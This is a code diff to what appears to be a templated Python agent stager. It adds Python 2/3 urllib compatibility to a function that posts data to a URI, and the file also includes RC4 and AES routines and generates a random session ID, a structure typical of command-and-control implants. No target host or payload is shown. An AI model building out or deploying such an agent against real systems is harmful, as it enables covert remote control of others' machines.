@@ -13,7 +13,11 @@ This file is a Jinja2 template.
 
 import random
 import string
-import urllib.request
+import sys
+if sys.version_info[0] >= 3:
+    import urllib.request as urllib;
+else:
+    import urllib2 as urllib;
 
 {% include 'common/rc4.py' %}
 {% include 'common/aes.py' %}
@@ -22,7 +26,7 @@ import urllib.request
 
 def post_message(uri, data):
     global headers
-    return (urllib.request.urlopen(urllib.request.Request(uri, data, headers))).read()
+    return (urllib.urlopen(urllib.Request(uri, data, headers))).read()
 
 # generate a randomized sessionID
 sessionID = b''.join(random.choice(string.ascii_uppercase + string.digits).encode('UTF-8') for _ in range(8))
